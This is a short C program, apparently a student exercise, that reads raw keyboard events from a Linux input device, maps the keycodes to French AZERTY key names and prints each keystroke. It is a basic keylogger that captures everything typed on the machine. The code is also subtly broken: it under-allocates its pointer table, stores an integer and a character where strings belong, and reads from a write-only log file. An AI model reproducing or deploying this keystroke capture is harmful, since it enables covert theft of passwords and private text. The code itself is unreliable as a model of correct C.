#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/input.h>
#include <string.h>
#include <stdio.h>

char	*convert_to_key(int nb)
{
  char	**dest;
  dest = malloc(sizeof(char) * 128);
  dest[1] = "ECHAP";
  dest[59] = "F1";
  dest[60] = "F2";
  dest[61] = "F3";
  dest[62] = "F4";
  dest[63] = "F5";
  dest[64] = "F6";
  dest[65] = "F7";
  dest[66] = "F8";
  dest[67] = "F9";
  dest[68] = "F10";
  dest[87] = "F11";
  dest[88] = "F12";
  dest[110] = "INSERT";
  dest[99] = "IMPR. ECRAN";
  dest[111] = "SUPPR.";
  dest[41] = "²";
  dest[2] = "&";
  dest[3] = "é";
  dest[4] = 34;
  dest[5] = "'";
  dest[6] = "(";
  dest[7] = "-";
  dest[8] = "è";
  dest[9] = "_";
  dest[10] = "ç";
  dest[11] = "à";
  dest[12] = ")";
  dest[13] = "=";
  dest[14] = "BACKSPACE";
  dest[102] = "ORIGINE";
  dest[15] = "TAB";
  dest[16] = "a";
  dest[17] = "z";
  dest[18] = "e";
  dest[19] = "r";
  dest[20] = "t";
  dest[21] = "y";
  dest[22] = "u";
  dest[23] = "i";
  dest[24] = "o";
  dest[25] = "p";
  dest[26] = "^";
  dest[27] = "$";
  dest[28] = "ENTREE";
  dest[104] = "PREVPG";
  dest[58] = "MAJ";
  dest[30] = "q";
  dest[31] = "s";
  dest[32] = "d";
  dest[33] = "f";
  dest[34] = "g";
  dest[35] = "h";
  dest[36] = "j";
  dest[37] = "k";
  dest[38] = "l";
  dest[39] = "m";
  dest[40] = "ù";
  dest[43] = "*";
  dest[109] = "NXTPG";
  dest[42] = "LSHIFT";
  dest[86] = "<";
  dest[44] = "w";
  dest[45] = "x";
  dest[46] = "c";
  dest[47] = "v";
  dest[48] = "b";
  dest[49] = "n";
  dest[50] = ",";
  dest[51] = ";";
  dest[52] = ':';
  dest[53] = "!";
  dest[54] = "RSHIFT";
  dest[107] = "END";
  dest[29] = "LCTRL";
  dest[125] = "DEM";
  dest[56] = "ALT";
  dest[57] = "SPACE";
  dest[100] = "ALTGR";
  dest[127] = "CR.DR";
  dest[97] = "RCTRL";
  dest[105] = "LEFT";
  dest[103] = "UP";
  dest[108] = "DOWN";
  dest[106] = "RIGHT";

  return (dest[nb]);
}

int	main(int ac, char **av)
{
  FILE *file;
  const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
  struct input_event ev;
  ssize_t n;
  int fd;
  int log_fd;
  char buffer[400];

  file = fopen("./log.txt", "w");
  fd = open(dev, O_RDONLY);
  if (fd == -1) {
    fprintf(stderr, "Cannot open %s: %s.\n", dev, strerror(errno));
    return EXIT_FAILURE;
  }
  fread(buffer, 100, 1, file);
  while (1) {
    n = read(fd, &ev, sizeof ev);
    if (n == (ssize_t)-1) {
      if (errno == EINTR)
	continue;
      else
	break;
    } else
      if (n != sizeof ev) {
	errno = EIO;
	break;
      }
    if (ev.type == EV_KEY && ev.value == 0)
      {
	fputs("SALUT", file);
	fread(buffer, 100, 1, file);
        printf("%s\n", convert_to_key(ev.code));
      }
  }
  fflush(stdout);
  fprintf(stderr, "%s.\n", strerror(errno));
  fclose(file);
  return EXIT_FAILURE;
}
